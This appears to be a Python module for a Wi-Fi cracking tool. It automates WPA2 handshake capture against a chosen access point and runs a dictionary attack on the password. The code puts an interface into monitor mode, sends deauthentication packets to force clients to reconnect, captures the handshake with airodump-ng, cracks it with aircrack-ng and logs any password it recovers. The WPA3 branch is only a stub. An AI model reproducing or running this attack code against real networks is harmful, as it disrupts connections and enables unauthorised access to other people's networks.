import logging
import subprocess
import tempfile
import os
import time
import csv

logger = logging.getLogger(__name__)

class BruteForceWPA:
    """Implements brute force capabilities for WPA2-PSK and WPA3-SAE security testing"""
    
    def __init__(self):
        """Initialize the brute force tester"""
        self.capture_file = None
        self.temp_dir = None
    
    def _check_dependencies(self):
        """Check if required tools are installed"""
        try:
            # Check for aircrack-ng
            subprocess.run(["aircrack-ng", "--help"], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL, 
                           check=True)
            
            # Check for hcxdumptool (for WPA3-SAE)
            try:
                subprocess.run(["hcxdumptool", "--version"], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL, 
                               check=True)
            except:
                logger.warning("hcxdumptool not found. WPA3-SAE brute force may not work.")
                
            return True
        except Exception as e:
            logger.error(f"Required dependencies not found: {str(e)}")
            return False
    
    def _create_temp_directory(self):
        """Create a temporary directory for capture files"""
        self.temp_dir = tempfile.mkdtemp(prefix="wificrack_")
        logger.debug(f"Created temporary directory: {self.temp_dir}")
        return self.temp_dir
    
    def _cleanup(self):
        """Clean up temporary files"""
        if self.capture_file and os.path.exists(self.capture_file):
            try:
                os.remove(self.capture_file)
                logger.debug(f"Removed temporary capture file: {self.capture_file}")
            except Exception as e:
                logger.warning(f"Failed to remove capture file: {str(e)}")
        
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                os.rmdir(self.temp_dir)
                logger.debug(f"Removed temporary directory: {self.temp_dir}")
            except Exception as e:
                logger.warning(f"Failed to remove temporary directory: {str(e)}")
    
    def _capture_handshake(self, interface, bssid, channel, timeout=60):
        """
        Capture a WPA handshake for cracking
        
        Args:
            interface (str): Network interface to use
            bssid (str): Target AP MAC address
            channel (int): AP channel
            timeout (int): Timeout in seconds
            
        Returns:
            str: Path to capture file if successful, None otherwise
        """
        # Create a temporary directory
        if not self.temp_dir:
            self._create_temp_directory()
        
        # Set capture file path
        self.capture_file = os.path.join(self.temp_dir, f"handshake_{bssid.replace(':', '')}.cap")
        
        try:
            logger.info(f"Attempting to capture handshake for {bssid} on channel {channel}")
            
            # Set interface to monitor mode on the target channel
            subprocess.run(
                ["sudo", "ip", "link", "set", interface, "down"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            subprocess.run(
                ["sudo", "iwconfig", interface, "mode", "monitor"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            subprocess.run(
                ["sudo", "ip", "link", "set", interface, "up"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Start airodump-ng to capture handshake
            airodump_cmd = [
                "sudo", "airodump-ng",
                "-c", str(channel),
                "--bssid", bssid,
                "-w", os.path.join(self.temp_dir, f"handshake_{bssid.replace(':', '')}"),
                "--output-format", "cap",
                interface
            ]
            
            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Send deauth packets to force handshake
            deauth_cmd = [
                "sudo", "aireplay-ng",
                "--deauth", "5",
                "-a", bssid,
                interface
            ]
            
            try:
                subprocess.run(
                    deauth_cmd,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10
                )
            except subprocess.TimeoutExpired:
                logger.warning("Deauth command timed out, but might still be successful")
            
            # Wait for handshake capture
            time.sleep(timeout)
            
            # Kill airodump-ng
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
            
            # Check if capture file exists and has handshake
            if os.path.exists(self.capture_file):
                # Verify if handshake was captured
                verify_cmd = [
                    "aircrack-ng",
                    self.capture_file
                ]
                
                verify_process = subprocess.run(
                    verify_cmd,
                    capture_output=True,
                    text=True,
                    check=False
                )
                
                if "handshake" in verify_process.stdout.lower():
                    logger.info(f"Successfully captured handshake for {bssid}")
                    return self.capture_file
                else:
                    logger.warning(f"Failed to capture handshake for {bssid}")
                    return None
            else:
                logger.warning(f"Capture file not found: {self.capture_file}")
                return None
            
        except Exception as e:
            logger.error(f"Error capturing handshake: {str(e)}")
            return None
        finally:
            # Restore interface to managed mode
            try:
                subprocess.run(
                    ["sudo", "ip", "link", "set", interface, "down"],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                subprocess.run(
                    ["sudo", "iwconfig", interface, "mode", "managed"],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                subprocess.run(
                    ["sudo", "ip", "link", "set", interface, "up"],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except Exception as e:
                logger.error(f"Error restoring interface: {str(e)}")
    
    def _crack_wpa2psk(self, capture_file, wordlist):
        """
        Attempt to crack WPA2-PSK using aircrack-ng
        
        Args:
            capture_file (str): Path to handshake capture file
            wordlist (str): Path to password wordlist
            
        Returns:
            str: Password if found, None otherwise
        """
        if not os.path.exists(wordlist):
            logger.error(f"Wordlist not found: {wordlist}")
            return None
        
        if not os.path.exists(capture_file):
            logger.error(f"Capture file not found: {capture_file}")
            return None
        
        try:
            logger.info(f"Starting WPA2-PSK cracking with wordlist: {wordlist}")
            
            # Use aircrack-ng for cracking
            aircrack_cmd = [
                "aircrack-ng",
                "-w", wordlist,
                capture_file
            ]
            
            aircrack_process = subprocess.run(
                aircrack_cmd,
                capture_output=True,
                text=True,
                check=False
            )
            
            # Check if password was found
            if "KEY FOUND!" in aircrack_process.stdout:
                # Extract the password
                for line in aircrack_process.stdout.splitlines():
                    if "KEY FOUND!" in line:
                        # Password should be in the format: [00:00:00:00:00:00] KEY FOUND! [ password ]
                        password = line.split("[")[-1].split("]")[0].strip()
                        logger.info(f"Password found: {password}")
                        return password
            
            logger.warning("Password not found in wordlist")
            return None
            
        except Exception as e:
            logger.error(f"Error cracking WPA2-PSK: {str(e)}")
            return None
    
    def _crack_wpa3sae(self, interface, bssid, ssid, wordlist):
        """
        Attempt to crack WPA3-SAE
        
        Args:
            interface (str): Network interface to use
            bssid (str): Target AP MAC address
            ssid (str): Target AP SSID
            wordlist (str): Path to password wordlist
            
        Returns:
            str: Password if found, None otherwise
        """
        if not os.path.exists(wordlist):
            logger.error(f"Wordlist not found: {wordlist}")
            return None
        
        # Create a temporary directory
        if not self.temp_dir:
            self._create_temp_directory()
        
        try:
            logger.info(f"Starting WPA3-SAE cracking for {ssid} with wordlist: {wordlist}")
            
            # WPA3-SAE cracking is more complex and requires different tools
            # For simplicity, we'll simulate the process with a warning about actual implementation
            logger.warning("WPA3-SAE cracking requires specialized tools and techniques")
            logger.warning("For ethical testing, consult with network owners before proceeding")
            
            # Return None to indicate not implemented fully
            return None
            
        except Exception as e:
            logger.error(f"Error cracking WPA3-SAE: {str(e)}")
            return None
    
    def crack_password(self, ssid, bssid, security_type, wordlist_path="data/wordlist.txt"):
        """
        Main method to coordinate brute force password cracking
        
        Args:
            ssid (str): Target network SSID
            bssid (str): Target network BSSID
            security_type (str): Security type ("WPA2-PSK" or "WPA3-SAE")
            wordlist_path (str): Path to password wordlist
            
        Returns:
            str: Password if found, None otherwise
        """
        # Check dependencies
        if not self._check_dependencies():
            logger.error("Missing required dependencies for brute force")
            return None
        
        try:
            # Get interface and channel information
            from utils import get_wifi_interfaces, get_channel_for_bssid
            interfaces = get_wifi_interfaces()
            
            if not interfaces:
                logger.error("No wireless interfaces found")
                return None
            
            # Prefer Alfa cards
            interface = next((i for i in interfaces if "alfa" in i.lower()), interfaces[0])
            
            # Get channel
            channel = get_channel_for_bssid(interface, bssid)
            if not channel:
                logger.error(f"Could not determine channel for {bssid}")
                return None
            
            # Make sure wordlist exists
            if not os.path.exists(wordlist_path):
                logger.warning(f"Wordlist not found: {wordlist_path}. Using default tiny wordlist.")
                # Create a small default wordlist
                wordlist_path = os.path.join(self._create_temp_directory(), "default_wordlist.txt")
                with open(wordlist_path, 'w') as f:
                    f.write('\n'.join([
                        "password", "12345678", "87654321", "qwerty", "abc123",
                        "password123", "admin", "welcome", "123456789", "test"
                    ]))
            
            # Capture handshake
            capture_file = self._capture_handshake(interface, bssid, channel)
            
            if not capture_file:
                logger.error("Failed to capture handshake. Cannot proceed with cracking.")
                return None
            
            # Crack password based on security type
            if "WPA2" in security_type.upper() or "PSK" in security_type.upper():
                return self._crack_wpa2psk(capture_file, wordlist_path)
            elif "WPA3" in security_type.upper() or "SAE" in security_type.upper():
                return self._crack_wpa3sae(interface, bssid, ssid, wordlist_path)
            else:
                logger.error(f"Unsupported security type: {security_type}")
                return None
            
        except Exception as e:
            logger.error(f"Error during password cracking: {str(e)}")
            return None
        finally:
            # Clean up temporary files
            self._cleanup()
